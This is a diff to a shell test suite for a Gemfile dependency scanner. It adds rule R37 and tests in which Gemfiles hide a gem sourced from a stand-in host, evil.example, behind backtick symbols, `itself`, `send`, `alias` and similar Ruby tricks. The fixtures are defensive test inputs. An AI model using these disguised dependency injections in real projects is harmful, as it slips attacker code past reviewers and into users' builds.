@@ -144,6 +144,11 @@
 #      ordinary Gemfile (rails new's %i[ ] platforms, a =~ /darwin/
 #      modifier, a when /^3/ branch, a key?(x) predicate, a # comment, a
 #      #{repo} interpolation) becomes unreadable
+#   R37 a gem or source call the Gemfile makes indirectly: through a receiver
+#      other than self directly (`itself.gem`, `(self).gem`, `self .gem`,
+#      `x.path`), through Ruby's metaprogramming (`send(:gem, ...)`,
+#      `instance_eval`, `alias`), or after a backtick method name or symbol
+#      (`` :` ``), which the quote pairing reads as a command string
 
 { [ -n "${REPO_ROOT:-}" ] && declare -F _flow_assert_fail >/dev/null \
     && source "$REPO_ROOT/plugins/flow/tests/lib/e2e.sh"; } || {
@@ -405,11 +410,11 @@ DEP_REPLACED=local -> ../#$vendor@(unpinned) manifest=Gemfile:5
 DEP_REPLACED=rack -> https://github.com/#@org/rack@(unpinned) manifest=Gemfile:2
 DEP_REPLACED=rake -> github:evil/#{rake}@(unpinned) manifest=Gemfile:3'
 
-_dep dep-gem-backtick-block "a backtick command is a string whose # is not a comment, and not a literal (R17)" Gemfile \
+_dep dep-gem-backtick-block "a backtick command makes the file unreadable, never a block target read as a literal (R17, R37)" Gemfile \
 $'gem "rails", "7.0.0"\n' \
 $'gem "rails", "7.0.0"\ngit `echo https://github.com/#{ENV["FORK"]}/rails.git` do\n  gem "activesupport"\nend\n' \
 'STATE=unavailable
-MANIFEST_UNPARSED=Gemfile reason=the git block on line 2 does not name a string literal at head'
+MANIFEST_UNPARSED=Gemfile reason=line 2 holds a backtick (a command string, or a method or symbol named `), which this does not read: it can hide a gem call or a source at head'
 
 _dep dep-gem-setter-def "a setter or operator def opens a block; only an endless def does not (R16)" Gemfile \
 $'gem "rails", "7.0.0"\n' \
@@ -839,6 +844,30 @@ _gem_refused() {
 MANIFEST_UNPARSED=Gemfile reason=$4 at head"
 }
 _holds() { printf 'line %s holds %s, which this does not read: it can hide a gem call or a source' "$1" "$2"; }
+
+_gem_refused dep-gem-refused-backtick-symbol "a backtick used as a symbol or method name makes the file unreadable: two of them pair over the gem call (R37)" \
+$'gem "rails", "7.0.0"\nx = :`; gem "evil", git: "https://evil.example/e.git"; y = :`\n' \
+"$(_holds 2 'a backtick (a command string, or a method or symbol named `)')"
+
+_gem_refused dep-gem-refused-itself "a gem call on itself is a Gemfile call this does not read (R37)" \
+$'gem "rails", "7.0.0"\nitself.gem "evil", git: "https://evil.example/e.git"\n' \
+"$(_holds 2 'a source method called on a receiver other than self, or Ruby metaprogramming')"
+
+_gem_refused dep-gem-refused-self-paren "a gem call on (self) is a Gemfile call this does not read (R37)" \
+$'gem "rails", "7.0.0"\n(self).gem "evil", git: "https://evil.example/e.git"\n' \
+"$(_holds 2 'a source method called on a receiver other than self, or Ruby metaprogramming')"
+
+_gem_refused dep-gem-refused-self-space "a path block on self written with a space before the dot is refused (R37)" \
+$'gem "rails", "7.0.0"\nself .path("vendor/x") do\n  gem "evil"\nend\n' \
+"$(_holds 2 'a source method called on a receiver other than self, or Ruby metaprogramming')"
+
+_gem_refused dep-gem-refused-send "a gem call made with send is refused (R37)" \
+$'gem "rails", "7.0.0"\nsend(:gem, "evil", git: "https://evil.example/e.git")\n' \
+"$(_holds 2 'a source method called on a receiver other than self, or Ruby metaprogramming')"
+
+_gem_refused dep-gem-refused-alias "an alias of gem is refused (R37)" \
+$'gem "rails", "7.0.0"\nalias g gem\ng "evil", git: "https://evil.example/e.git"\n' \
+"$(_holds 2 'a source method called on a receiver other than self, or Ruby metaprogramming')"
 
 _gem_refused dep-gem-refused-char-dollar "a character literal ?\$ before a string makes the file unreadable: the scanner pairs \$\" over the gem call (R36)" \
 $'gem "rails", "7.0.0"\nx = ?$"a"; gem "evil", git: "https://evil.example/e.git"\n' \
